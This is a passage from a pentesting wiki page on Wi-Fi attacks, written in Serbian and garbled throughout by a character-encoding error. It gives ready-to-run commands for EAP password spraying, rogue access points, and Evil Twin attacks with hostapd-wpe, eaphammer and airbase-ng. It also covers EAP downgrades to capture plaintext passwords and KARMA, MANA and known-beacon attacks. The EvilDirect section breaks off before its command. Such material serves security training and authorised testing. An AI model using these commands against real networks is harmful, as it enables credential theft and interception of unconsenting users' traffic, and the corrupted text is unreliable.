atributi autentifikacije izvuÄeni iz TLS tereta se zamenjuju u odlaznoj RADIUS poruci, zamenjujuÄ‡i anonimni User-Name i TTLS EAP-Message atribute pronaÄ‘ene u dolaznom RADIUS zahtevu.

Za viÅ¡e informacija pogledajte [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

Ako se oÄekuje da klijent koristi **korisniÄko ime i lozinku** (primetite da **EAP-TLS neÄ‡e biti validan** u ovom sluÄaju), onda moÅ¾ete pokuÅ¡ati da dobijete **listu** **korisniÄkih imena** (vidite sledeÄ‡i deo) i **lozinki** i pokuÅ¡ate da **bruteforce** pristup koristeÄ‡i [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
MoÅ¾ete takoÄ‘e izvrÅ¡iti ovaj napad koristeÄ‡i `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teorija napada na klijente

### Izbor mreÅ¾e i roaming

* 802.11 protokol definiÅ¡e kako stacija pridruÅ¾uje proÅ¡irenom servisnom skupu (ESS), ali ne specificira kriterijume za izbor ESS-a ili pristupne taÄke (AP) unutar njega.
* Stanice mogu da se kreÄ‡u izmeÄ‘u AP-ova koji dele isti ESSID, odrÅ¾avajuÄ‡i povezanost Å¡irom zgrade ili podruÄja.
* Protokol zahteva autentifikaciju stanice na ESS, ali ne nalaÅ¾e autentifikaciju AP-a prema stanici.

### Liste preferiranih mreÅ¾a (PNL)

* Stanice Äuvaju ESSID svake beÅ¾iÄne mreÅ¾e kojoj se povezuju u svojoj listi preferiranih mreÅ¾a (PNL), zajedno sa specifiÄnim konfiguracionim detaljima mreÅ¾e.
* PNL se koristi za automatsko povezivanje na poznate mreÅ¾e, poboljÅ¡avajuÄ‡i korisniÄko iskustvo pojednostavljivanjem procesa povezivanja.

### Pasivno skeniranje

* AP-ovi periodiÄno emituju beacon okvire, najavljujuÄ‡i svoje prisustvo i karakteristike, ukljuÄujuÄ‡i ESSID AP-a osim ako emitovanje nije onemoguÄ‡eno.
* Tokom pasivnog skeniranja, stanice sluÅ¡aju beacon okvire. Ako se ESSID beacona poklapa sa stavkom u PNL-u stanice, stanica se moÅ¾e automatski povezati na taj AP.
* Poznavanje PNL-a ureÄ‘aja omoguÄ‡ava potencijalnu eksploataciju oponaÅ¡anjem ESSID-a poznate mreÅ¾e, obmanjujuÄ‡i ureÄ‘aj da se poveÅ¾e na laÅ¾ni AP.

### Aktivno ispitivanje

* Aktivno ispitivanje ukljuÄuje stanice koje Å¡alju probe zahteve kako bi otkrile obliÅ¾nje AP-ove i njihove karakteristike.
* Usmereni probe zahtevi ciljaju specifiÄan ESSID, pomaÅ¾uÄ‡i u otkrivanju da li je odreÄ‘ena mreÅ¾a u dometu, Äak i ako je skrivena mreÅ¾a.
* Emitovani probe zahtevi imaju prazan SSID polje i Å¡alju se svim obliÅ¾njim AP-ovima, omoguÄ‡avajuÄ‡i stanici da proveri bilo koju preferiranu mreÅ¾u bez otkrivanja sadrÅ¾aja svog PNL-a.

## Jednostavan AP sa preusmeravanjem na Internet

Pre nego Å¡to se objasni kako izvesti sloÅ¾enije napade, biÄ‡e objaÅ¡njeno **kako** jednostavno **napraviti** **AP** i **preusmeriti** njegov **saobraÄ‡aj** na interfejs povezan **na** **Internet**.

KoristeÄ‡i `ifconfig -a`, proverite da li su prisutni wlan interfejs za kreiranje AP-a i interfejs povezan na Internet.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Kreirajte konfiguracioni fajl `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Zatim **postavite IP adrese** i **puteve**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
I zatim **pokrenite** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Kreirajte konfiguracioni fajl `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Prekinite dosadne procese**, postavite **monitor mod**, i **pokrenite hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### ProsleÄ‘ivanje i Preusmeravanje
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Napad zlog blizanca koristi naÄin na koji WiFi klijenti prepoznaju mreÅ¾e, prvenstveno oslanjajuÄ‡i se na ime mreÅ¾e (ESSID) bez potrebe da bazna stanica (pristupna taÄka) autentifikuje sebe klijentu. KljuÄne taÄke ukljuÄuju:

* **TeÅ¡koÄ‡e u Diferencijaciji**: UreÄ‘aji se bore da razlikuju legitimne i laÅ¾ne pristupne taÄke kada dele isto ESSID i tip enkripcije. MreÅ¾e u stvarnom svetu Äesto koriste viÅ¡e pristupnih taÄaka sa istim ESSID-om kako bi neprimetno proÅ¡irile pokrivenost.
* **Roaming Klijenata i Manipulacija Povezivanjem**: 802.11 protokol omoguÄ‡ava ureÄ‘ajima da se kreÄ‡u izmeÄ‘u pristupnih taÄaka unutar iste ESS. NapadaÄi mogu iskoristiti ovo tako Å¡to Ä‡e namamiti ureÄ‘aj da se disconectuje od svoje trenutne bazne stanice i poveÅ¾e se sa laÅ¾nom. Ovo se moÅ¾e postiÄ‡i nudeÄ‡i jaÄi signal ili ometajuÄ‡i vezu sa legitimnom pristupnom taÄkom putem metoda kao Å¡to su deautentifikacijski paketi ili ometanje.
* **Izazovi u IzvrÅ¡enju**: UspeÅ¡no izvrÅ¡avanje napada zlog blizanca u okruÅ¾enjima sa viÅ¡e, dobro postavljenih pristupnih taÄaka moÅ¾e biti izazovno. Deautentifikacija jedne legitimne pristupne taÄke Äesto rezultira povezivanjem ureÄ‘aja sa drugom legitimnom pristupnom taÄkom, osim ako napadaÄ ne moÅ¾e deautentifikovati sve obliÅ¾nje pristupne taÄke ili strateÅ¡ki postaviti laÅ¾nu pristupnu taÄku.

MoÅ¾ete kreirati vrlo osnovni Open Evil Twin (bez moguÄ‡nosti usmeravanja saobraÄ‡aja na Internet) tako Å¡to Ä‡ete:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
MoÅ¾ete takoÄ‘e kreirati Evil Twin koristeÄ‡i **eaphammer** (imajte na umu da interfejs **NE TREBA** da bude u **monitor** reÅ¾imu):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ili koriÅ¡Ä‡enjem Airgeddon-a: `Opcije: 5,6,7,8,9 (unutar menija za Evil Twin napad).`

![](<../../.gitbook/assets/image (1088).png>)

Molimo vas da primetite da, po defaultu, ako je ESSID u PNL saÄuvan kao WPA zaÅ¡tiÄ‡en, ureÄ‘aj se neÄ‡e automatski povezati na Open evil Twin. MoÅ¾ete pokuÅ¡ati da DoS-ujete pravi AP i nadati se da Ä‡e se korisnik ruÄno povezati na vaÅ¡ Open evil Twin, ili moÅ¾ete DoS-ovati pravi AP i koristiti WPA Evil Twin da uhvatite handshake (koristeÄ‡i ovu metodu neÄ‡ete moÄ‡i da omoguÄ‡ite Å¾rtvi da se poveÅ¾e sa vama jer ne znate PSK, ali moÅ¾ete uhvatiti handshake i pokuÅ¡ati da ga crack-ujete).

_Neki OS i AV Ä‡e upozoriti korisnika da je povezivanje na Open mreÅ¾u opasno..._

### WPA/WPA2 Evil Twin

MoÅ¾ete kreirati **Evil Twin koristeÄ‡i WPA/2** i ako su ureÄ‘aji konfigurisani da se poveÅ¾u na taj SSID sa WPA/2, pokuÅ¡aÄ‡e da se poveÅ¾u. U svakom sluÄaju, **da biste zavrÅ¡ili 4-way-handshake** takoÄ‘e morate **znati** **lozinku** koju Ä‡e klijent koristiti. Ako je **ne znate**, **povezivanje neÄ‡e biti zavrÅ¡eno**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Da biste razumeli ovaj napad, preporuÄujem da prvo proÄitate kratak [WPA Enterprise objaÅ¡njenje](./#wpa-enterprise-mgt).

**KoriÅ¡Ä‡enje hostapd-wpe**

`hostapd-wpe` zahteva **konfiguraciju** datoteku da bi radio. Da biste **automatizovali** generisanje ovih konfiguracija, moÅ¾ete koristiti [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (preuzmite python datoteku unutar _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
U konfiguracionom fajlu moÅ¾ete odabrati mnogo razliÄitih stvari kao Å¡to su ssid, kanal, korisniÄki fajlovi, cret/kljuÄ, dh parametri, wpa verzija i autentifikacija...

[**KoriÅ¡Ä‡enje hostapd-wpe sa EAP-TLS za omoguÄ‡avanje prijavljivanja sa bilo kojim sertifikatom.**](evil-twin-eap-tls.md)

**KoriÅ¡Ä‡enje EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Podrazumevano, EAPHammer predlaÅ¾e ove metode autentifikacije (primetite GTC kao prvu koju treba pokuÅ¡ati da se dobiju lozinke u obiÄnom tekstu, a zatim koriÅ¡Ä‡enje robusnijih metoda autentifikacije):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Ovo je podrazumevana metodologija za izbegavanje dugih vremena povezivanja. MeÄ‘utim, takoÄ‘e moÅ¾ete odrediti serveru metode autentifikacije od najslabije do najjaÄe:
```
--negotiate weakest
```
Ili moÅ¾ete koristiti i:

* `--negotiate gtc-downgrade` za koriÅ¡Ä‡enje veoma efikasne GTC downgrade implementacije (plaintext lozinke)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` da ruÄno odredite ponuÄ‘ene metode (ponudom istih metoda autentifikacije u istom redosledu, napad Ä‡e biti mnogo teÅ¾e otkriti).
* [PronaÄ‘ite viÅ¡e informacija u wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**KoriÅ¡Ä‡enje Airgeddon-a**

`Airgeddon` moÅ¾e koristiti prethodno generisane sertifikate za ponudu EAP autentifikacije za WPA/WPA2-Enterprise mreÅ¾e. LaÅ¾na mreÅ¾a Ä‡e smanjiti protokol veze na EAP-MD5 kako bi mogla da **uhvati korisnika i MD5 lozinke**. Kasnije, napadaÄ moÅ¾e pokuÅ¡ati da provali lozinku.\
`Airgeddon` vam nudi moguÄ‡nost **kontinuiranog Evil Twin napada (buÄan)** ili **samo kreiranje Evil napada dok se neko ne poveÅ¾e (glatko).**

![](<../../.gitbook/assets/image (936).png>)

### Debagovanje PEAP i EAP-TTLS TLS tunela u Evil Twin napadima

_Ova metoda je testirana u PEAP vezi, ali poÅ¡to dekriptujem proizvoljan TLS tunel, ovo bi takoÄ‘e trebalo da funkcioniÅ¡e sa EAP-TTLS_

Unutar **konfiguracije** _hostapd-wpe_ **komentariÅ¡ite** liniju koja sadrÅ¾i _**dh\_file**_ (od `dh_file=/etc/hostapd-wpe/certs/dh` do `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Ovo Ä‡e omoguÄ‡iti `hostapd-wpe` da **razmenjuje kljuÄeve koristeÄ‡i RSA** umesto DH, tako da Ä‡ete moÄ‡i da **dekriptujete** saobraÄ‡aj kasnije **znajuÄ‡i privatni kljuÄ servera**.

Sada pokrenite **Evil Twin** koristeÄ‡i **`hostapd-wpe`** sa tom izmenjenom konfiguracijom kao obiÄno. TakoÄ‘e, pokrenite **`wireshark`** na **interfejsu** koji vrÅ¡i Evil Twin napad.

Sada ili kasnije (kada ste veÄ‡ uhvatili neke pokuÅ¡aje autentifikacije) moÅ¾ete dodati privatni RSA kljuÄ u wireshark u: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Dodajte novi unos i popunite formu sa ovim vrednostima: **IP adresa = bilo koja** -- **Port = 0** -- **Protokol = podaci** -- **KljuÄna datoteka** (**izaberite svoju datoteku kljuÄa**, da biste izbegli probleme, izaberite datoteku kljuÄa **bez zaÅ¡tite lozinkom**).

![](<../../.gitbook/assets/image (687).png>)

I pogledajte novi **"Decrypted TLS" tab**:

![](<../../.gitbook/assets/image (231).png>)

## KARMA, MANA, Loud MANA i napad poznatih beacon-a

### ESSID i MAC crne/belih lista

RazliÄite vrste lista filtera za pristup medijima (MFACLs) i njihovi odgovarajuÄ‡i reÅ¾imi i efekti na ponaÅ¡anje laÅ¾nog pristupnog taÄke (AP):

1. **MAC-bazirana bela lista**:
* LaÅ¾ni AP Ä‡e odgovarati samo na probe zahteve od ureÄ‘aja navedenih u beloj listi, ostajuÄ‡i nevidljiv za sve druge koji nisu navedeni.
2. **MAC-bazirana crna lista**:
* LaÅ¾ni AP Ä‡e ignorisati probe zahteve od ureÄ‘aja na crnoj listi, efektivno ÄineÄ‡i laÅ¾ni AP nevidljivim za te specifiÄne ureÄ‘aje.
3. **SSID-bazirana bela lista**:
* LaÅ¾ni AP Ä‡e odgovarati na probe zahteve samo za specifiÄne ESSID-e navedene, ÄineÄ‡i ga nevidljivim za ureÄ‘aje Äiji spiskovi preferiranih mreÅ¾a (PNL) ne sadrÅ¾e te ESSID-e.
4. **SSID-bazirana crna lista**:
* LaÅ¾ni AP neÄ‡e odgovarati na probe zahteve za specifiÄne ESSID-e na crnoj listi, ÄineÄ‡i ga nevidljivim za ureÄ‘aje koji traÅ¾e te odreÄ‘ene mreÅ¾e.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ova metoda omoguÄ‡ava **napadaÄu da kreira zloÄ‡udnu pristupnu taÄku (AP) koja odgovara na sve probe zahteve** od ureÄ‘aja koji traÅ¾e povezivanje na mreÅ¾e. Ova tehnika **vara ureÄ‘aje da se poveÅ¾u na napadaÄev AP** imitujuÄ‡i mreÅ¾e koje ureÄ‘aji traÅ¾e. Kada ureÄ‘aj poÅ¡alje zahtev za povezivanje ovoj laÅ¾noj AP, uspostavlja se veza, Å¡to dovodi do toga da se ureÄ‘aj pogreÅ¡no poveÅ¾e na napadaÄevu mreÅ¾u.

### MANA

Zatim, **ureÄ‘aji su poÄeli da ignoriÅ¡u neproÅ¡ene mreÅ¾ne odgovore**, smanjujuÄ‡i efikasnost originalnog karma napada. MeÄ‘utim, nova metoda, poznata kao **MANA napad**, uvedena je od strane Iana de Villiersa i Dominica Whitea. Ova metoda ukljuÄuje laÅ¾nu AP **koja hvata Liste preferiranih mreÅ¾a (PNL) sa ureÄ‘aja odgovarajuÄ‡i na njihove emitovane probe zahteve** sa imenima mreÅ¾a (SSID) koje su prethodno traÅ¾ili ureÄ‘aji. Ovaj sofisticirani napad zaobilazi zaÅ¡titu protiv originalnog karma napada iskoriÅ¡Ä‡avajuÄ‡i naÄin na koji ureÄ‘aji pamte i prioritetizuju poznate mreÅ¾e.

MANA napad funkcioniÅ¡e tako Å¡to prati kako usmerene tako i emitovane probe zahteve od ureÄ‘aja. Za usmerene zahteve, beleÅ¾i MAC adresu ureÄ‘aja i traÅ¾eno ime mreÅ¾e, dodajuÄ‡i ove informacije na listu. Kada se primi emitovani zahtev, AP odgovara informacijama koje odgovaraju bilo kojoj od mreÅ¾a na listi ureÄ‘aja, mameÄ‡i ureÄ‘aj da se poveÅ¾e na laÅ¾nu AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

**Loud MANA napad** je napredna strategija za situacije kada ureÄ‘aji ne koriste usmereno ispitivanje ili kada su njihovi spiskovi preferiranih mreÅ¾a (PNL) nepoznati napadaÄu. OperiÅ¡e na principu da **ureÄ‘aji u istoj oblasti verovatno dele neka imena mreÅ¾a u svojim PNL-ima**. Umesto da odgovara selektivno, ovaj napad emituje odgovore na ispitivanje za svako ime mreÅ¾e (ESSID) pronaÄ‘eno u kombinovanim PNL-ima svih posmatranih ureÄ‘aja. Ovaj Å¡iroki pristup poveÄ‡ava Å¡anse da ureÄ‘aj prepozna poznatu mreÅ¾u i pokuÅ¡a da se poveÅ¾e na laÅ¾ni pristupni punkt (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Kada **Loud MANA attack** moÅ¾da nije dovoljan, **Known Beacon attack** predstavlja drugi pristup. Ova metoda **brute-forces proces povezivanja simulirajuÄ‡i AP koji odgovara na bilo koje ime mreÅ¾e, prolazeÄ‡i kroz listu potencijalnih ESSID-a** dobijenih iz reÄnika. Ovo simulira prisustvo brojnih mreÅ¾a, nadajuÄ‡i se da Ä‡e se poklopiti sa ESSID-om unutar PNL-a Å¾rtve, podstiÄuÄ‡i pokuÅ¡aj povezivanja sa laÅ¾nim AP-om. Napad se moÅ¾e pojaÄati kombinovanjem sa `--loud` opcijom za agresivniji pokuÅ¡aj hvatanja ureÄ‘aja.

Eaphammer je implementirao ovaj napad kao MANA napad gde su svi ESSID-i unutar liste uÄitani (takoÄ‘e moÅ¾ete kombinovati ovo sa `--loud` da biste stvorili Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Poznati Beacon Burst napad**

**Poznati Beacon Burst napad** ukljuÄuje **brzo emitovanje beacon okvira za svaki ESSID naveden u datoteci**. Ovo stvara gustu sredinu laÅ¾nih mreÅ¾a, Å¡to znaÄajno poveÄ‡ava verovatnoÄ‡u da se ureÄ‘aji poveÅ¾u na rogue AP, posebno kada se kombinuje sa MANA napadom. Ova tehnika koristi brzinu i obim da bi preplavila mehanizme odabira mreÅ¾e ureÄ‘aja.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** je protokol koji omoguÄ‡ava ureÄ‘ajima da se direktno poveÅ¾u jedni s drugima koristeÄ‡i Wi-Fi bez potrebe za tradicionalnom beÅ¾iÄnom pristupnom taÄkom. Ova moguÄ‡nost je integrisana u razne ureÄ‘aje Interneta stvari (IoT), kao Å¡to su Å¡tampaÄi i televizori, olakÅ¡avajuÄ‡i direktnu komunikaciju izmeÄ‘u ureÄ‘aja. ZnaÄajna karakteristika Wi-Fi Direct-a je da jedan ureÄ‘aj preuzima ulogu pristupne taÄke, poznate kao vlasnik grupe, kako bi upravljao vezom.

Bezbednost za Wi-Fi Direct veze se uspostavlja putem **Wi-Fi Protected Setup (WPS)**, koji podrÅ¾ava nekoliko metoda za sigurno uparivanje, ukljuÄujuÄ‡i:

* **Push-Button Configuration (PBC)**
* **PIN unos**
* **Near-Field Communication (NFC)**

Ove metode, posebno unos PIN-a, su podloÅ¾ne istim ranjivostima kao WPS u tradicionalnim Wi-Fi mreÅ¾ama, ÄineÄ‡i ih metama za sliÄne napade.

### EvilDirect Hijacking

**EvilDirect Hijacking** je napad specifiÄan za Wi-Fi Direct. OponaÅ¡a koncept napada Evil Twin, ali cilja Wi-Fi Direct veze. U ovom scenariju, napadaÄ se pretvara da je legitimni vlasnik grupe s ciljem da prevari ureÄ‘aje da se poveÅ¾u na zloÄ‡udni entitet. Ova metoda se moÅ¾e izvrÅ¡iti koristeÄ‡i alate kao Å¡to je `airbase-ng` tako Å¡to se specificira kanal, ESSID i MAC adresa oponaÅ¡anog ureÄ‘aja:

## References

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Pogledajte [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (prijavite se putem facebook-a i imitacija WPA na captive portalima)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
